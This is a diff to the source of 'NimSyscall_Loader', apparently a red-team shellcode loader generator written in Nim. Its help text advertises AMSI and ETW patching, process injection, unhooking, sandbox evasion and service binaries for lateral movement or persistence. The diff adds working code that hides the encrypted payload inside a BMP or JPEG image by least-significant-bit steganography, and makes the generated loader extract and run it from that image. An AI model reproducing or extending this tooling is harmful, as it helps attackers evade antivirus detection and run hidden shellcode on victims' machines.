@@ -66,7 +66,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms>]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath>]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -99,6 +99,7 @@ Options:
   --sourceonly    Dont compile but just create the source code and compile command
   --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
   --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
+  --stegofile filepath    Path to a .bmp or jpeg file in which the encrypted payload will be embedded
 
 [Payload retrieval options]
 
@@ -234,6 +235,9 @@ var
     parentProcess: string = ""
     spoofArgs: string = ""
     shellcodeFile: seq[string] = @["enc.blob"]
+    stegofile: string = ""
+    useStego: bool = false
+    stFile: string = ""
     scfile: string = ""
     retrieveFromFile: bool = false
     shellcodeURL: string = ""
@@ -319,6 +323,16 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--stegofile"]:
+    useStego = true
+    let stegoFileString = args["--stegofile"]
+    stfile = fmt"{stegoFileString}"
+    echo stfile
+    if(stfile.contains("http")):
+        retrieveFromURL = true
+    stegofile = stfile
+    echo "Stego file: " & stegofile
 
 if args["--noDefaultSandBox"]:
     defaultSandBoxChecks = false
@@ -890,6 +904,131 @@ echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
 writeFile(shellcodeFile[0], content)
+
+
+### stego stuff, credit to @OffenseTeacher, https://github.com/OffenseTeacher/Steganim
+
+import streams
+
+proc toString(bytes: openarray[byte]): string =
+    result = newString(bytes.len)
+    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+proc nthBitPresent(b: byte,n: int): bool =
+    var a = 1 shl n
+    var b = int(b) and a
+    return b != 0
+
+proc extractByte(a: seq[bool]): byte =
+
+    var b: byte = 0
+    for i in 0 .. 7:
+        if a[i]:
+            b = b or (byte)(1 shl (7 - i))
+        else:
+            b = b or (byte)(0 shl (7 - i))
+    return b
+
+proc extractBytes(a: seq[byte],b: int): seq[byte] =
+    
+    var c: int = b
+
+    var d: seq[bool] = newSeq[bool](0)
+    for i in c .. len(a) - 1:
+        d.add(nthBitPresent(a[i], 0))
+    var e: seq[byte] = newseq[byte](0)
+
+    for i in countup(0, len(d), 8):
+        if len(d) - i > 8:
+            var tmp : byte = extractByte(d[i .. i + 8])
+            e.add(tmp)
+    e = e[1 .. (e.len - 1)]
+    var f = toByteSeq("\t")[0]
+    var idx = e.find(f);
+    var payloadLengthBytes: seq[byte] = e[0 .. idx - 1]
+    var p: int
+    var msg_len = (cast[ptr int32] (addr payloadLengthBytes[p]))[]
+    var finalPayload = e[idx+1 .. (idx + msg_len)]
+    return finalPayload
+
+proc getBytesFromFile(path: string): seq[byte] =
+    try:
+        var
+            s = newFileStream(path, fmRead)
+            valSeq = newSeq[byte]()
+        while not s.atEnd:
+            let element = s.readUInt8
+            valSeq.add(element)
+        s.close()
+        return valSeq
+    except:
+        echo "!! ", path, " was not found !!"
+        quit(1)
+
+proc mergeBaseImageWithPayload1BitPerByte(my_byte: byte, ends_in_one: bool): byte =
+    var new_byte: byte = my_byte;
+    if ends_in_one:
+        if not nthBitPresent(my_byte, 0):
+            new_byte = cast[byte](my_byte + 1)
+    else:
+        if (nthBitPresent(my_byte, 0)):
+            new_byte = cast[byte](my_byte - 1)
+    return new_byte;
+
+proc createSteganoImage(payloadPath: string, baseImagePath: string, outputFile: string): void =
+    var 
+        payloadBytes: seq[byte] = getBytesFromFile(payloadPath)
+        baseImageBytes: seq[byte] = getBytesFromFile(baseImagePath)
+        delimiter = toByteSeq("\t")[0]
+        start_offset: int = 50
+        payloadLengthInBytes = cast[array[sizeof(int32), byte]](payloadBytes.len)
+        payloadLengthInBytesReverse: seq[byte] = @[]
+    for r in countdown(payloadLengthInBytes.len - 1, 0):
+        payloadLengthInBytesReverse.add(payloadLengthInBytes[r])
+    payloadBytes = delimiter & payloadBytes
+
+    for b in payloadLengthInBytesReverse:
+        payloadBytes = b & payloadBytes
+
+    payloadBytes = delimiter & payloadBytes
+    var bits: seq[bool] = newSeq[bool](0)
+
+    for i in countup(0, payloadBytes.len - 1):
+        for j in countdown(7,0):
+            bits.add(nthBitPresent(payloadBytes[i], j))
+
+    if len(bits) > len(baseImageBytes) + start_offset:
+        echo "Payload too big for the image"
+        quit(1)
+
+    for i in 0 .. bits.len - 1:
+        baseImageBytes[i + start_offset] = mergeBaseImageWithPayload1BitPerByte(baseImageBytes[i + start_offset], bits[i])
+
+    var fHandle = open(outputFile, fmWrite)
+    discard writeBytes(fHandle,baseImageBytes,0,baseImageBytes.len)
+
+
+if(useStego):
+
+    if (stegofile.contains("http")):
+        # remove everything before the first / plus the / itself
+        var imageName = stegofile[stegofile.find("/", 0) + 1 .. stegofile.len - 1]
+        echo "[*] Downloading Image from: " & stegofile
+        echo "[*] Image Name: " & imageName
+
+    var 
+        inputPayload = shellcodeFile[0]
+        inputBaseImage = stegofile
+        outputSteganoFile = stegofile
+    echo "[*] Creating Stegano Image:"
+    echo "[*] Payload: " & inputPayload
+    echo "[*] Base Image: " & inputBaseImage
+    echo "[*] Output Image: " & outputSteganoFile
+    createSteganoImage(inputPayload, inputBaseImage, outputSteganoFile)
+
+
+### stego stuff end
+
 
 if(macPayload):
     echo "[*] Converting Shellcode to MAC-Adresses: "
@@ -1690,6 +1829,78 @@ for i in 0 ..< rowLen:
 
 let Cryptstub15 = fmt"""
 
+when defined(Stego):
+    import streams
+
+    proc nthBitPresent(b: byte,n: int): bool =
+        var a = 1 shl n
+        var b = int(b) and a
+        return b != 0
+
+    proc extractByte(a: seq[bool]): byte =
+
+        var b: byte = 0
+        for i in 0 .. 7:
+            if a[i]:
+                b = b or (byte)(1 shl (7 - i))
+            else:
+                b = b or (byte)(0 shl (7 - i))
+        return b
+
+    proc extractBytes(a: seq[byte],b: int): seq[byte] =
+        
+        var c: int = b
+
+        var d: seq[bool] = newSeq[bool](0)
+        for i in c .. len(a) - 1:
+            d.add(nthBitPresent(a[i], 0))
+        var e: seq[byte] = newseq[byte](0)
+
+        for i in countup(0, len(d), 8):
+            if len(d) - i > 8:
+                var tmp : byte = extractByte(d[i .. i + 8])
+                e.add(tmp)
+        e = e[1 .. (e.len - 1)]
+        var f = toByteSeq("\t")[0]
+        var idx = e.find(f);
+        var payloadLengthBytes: seq[byte] = e[0 .. idx - 1]
+        var p: int
+        var msg_len = (cast[ptr int32] (addr payloadLengthBytes[p]))[]
+        var finalPayload = e[idx+1 .. (idx + msg_len)]
+        return finalPayload
+
+    proc getBytesFromFile(path: string): seq[byte] =
+        try:
+            var
+                s = newFileStream(path, fmRead)
+                valSeq = newSeq[byte]()
+            while not s.atEnd:
+                let element = s.readUInt8
+                valSeq.add(element)
+            s.close()
+            return valSeq
+        except:
+            echo "!! ", path, " was not found !!"
+            quit(1)
+
+    proc mergeBaseImageWithPayload1BitPerByte(my_byte: byte, ends_in_one: bool): byte =
+        var new_byte: byte = my_byte;
+        if ends_in_one:
+            if not nthBitPresent(my_byte, 0):
+                new_byte = cast[byte](my_byte + 1)
+        else:
+            if (nthBitPresent(my_byte, 0)):
+                new_byte = cast[byte](my_byte - 1)
+        return new_byte;
+
+    proc getFromStegano(path: string): seq[byte] =
+        var 
+            c = getBytesFromFile(path)
+            a = 50
+            shellcode: seq[byte] = extractBytes(c, a)
+        return shellcode
+
+
 when defined(AllocateDripStyle):
     var dripsleepinbetween = {dripsleepinbetween}
 
@@ -1709,6 +1920,18 @@ else:
     var envkey2 = envkey
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
+
+when defined(Stego):
+    when defined(verbose):
+        echo obf("[*] Stego mode enabled...")
+        echo obf("[*] Extracting payload from stegofile...")
+    var encstring: string = toString(getFromStegano("{stegofile}"))
+    when defined(verbose):
+        echo obf("[*] Payload length: "), len(encstring)
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
+
+
 when defined(PayloadEmbedded):
     when defined(macPayload):
         var enctext = newSeq[byte](len(mac)*(6))
@@ -1725,9 +1948,10 @@ when defined(PayloadEmbedded):
         # Move the encrypted Shellcode into the enctext sequence
         moveMem(addr enctext[0], alloc_mem, len(enctext))
     else:
-        const encstring = slurp"enc.blob"
-        var enctext: seq[byte] = toByteSeq(encstring)
-        var dectext = newSeq[byte](len(enctext))
+        when not defined(Stego):
+            const encstring = slurp"enc.blob"
+            var enctext: seq[byte] = toByteSeq(encstring)
+            var dectext = newSeq[byte](len(enctext))
 """
 
 let Cryptstub2 = fmt"""
@@ -2788,6 +3012,9 @@ if(dripallocate):
 if(antidebug):
     basicCompileFlags.add("-d:AntiDebug ")
 
+if(useStego):
+    basicCompileFlags.add("-d:Stego ")
+
 if(macPayload):
     basicCompileFlags.add("-d:macPayload ")
 
@@ -3213,6 +3440,9 @@ if(exists):
 else:
     echo "\r\nCompilation failed!! Check the error message.\r\n"
 
+if(useStego):
+    echo "\r\n[*] The payload is saved in the image: " & stegofile & "\r\n"
+    echo "[*] You need to drop that image to the same directory as the loader to have a working payload ;-)"
 
 #[Here comes a function, that takes an string as input and pushes that into a char array ]#
 proc toByteSeq(s: string): seq[byte] =
